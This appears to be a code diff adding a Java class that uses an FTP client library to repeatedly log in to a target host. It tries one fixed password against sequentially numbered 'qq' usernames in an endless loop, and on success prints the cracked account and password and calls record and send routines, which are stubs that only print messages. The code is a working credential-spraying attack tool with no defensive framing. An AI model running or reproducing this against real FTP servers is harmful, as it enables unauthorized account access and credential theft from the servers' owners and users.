@@ -1,0 +1,56 @@
+package com.robin;
+
+import java.io.IOException;
+import java.net.SocketException;
+import org.apache.commons.net.ftp.FTPClient;
+
+class goFtp extends Ftp {
+	public goFtp(int _port, String _host, String _password, int _user) {
+		super(_port, _host, _password, _user);
+	}
+
+	@Override
+	public void goLogin() {
+		FTPClient ftp = new FTPClient();
+		while (true) {
+			try {
+				ftp.connect(this.host, this.port);
+				if (ftp.login("qq" + Integer.toString(this.user), this.password) == true) {
+					loginWin();
+				} else {
+					System.out.println("登录失败");
+					setRecord();
+				}
+			} catch (SocketException e) {
+				System.out.println("登录失败");
+				setRecord();
+			} catch (IOException e) {
+				System.out.println("host错误");
+				setRecord();
+			}
+			this.user++;
+			System.out.println(this.user);
+		}
+	}
+
+	/*
+	 * 登录成功后的操作: 记录>发送记录
+	 */
+	@Override
+	public void loginWin() {
+		System.out.println("登录成功:\n账号:" + this.user + "\n密码" + this.password + "\n");
+		setRecord();
+		sendRecord();
+	}
+
+	@Override
+	public void setRecord() {
+		System.out.println("记录成功!");
+	}
+
+	@Override
+	public void sendRecord() {
+		System.out.println("发送成功!");
+	}
+
+}
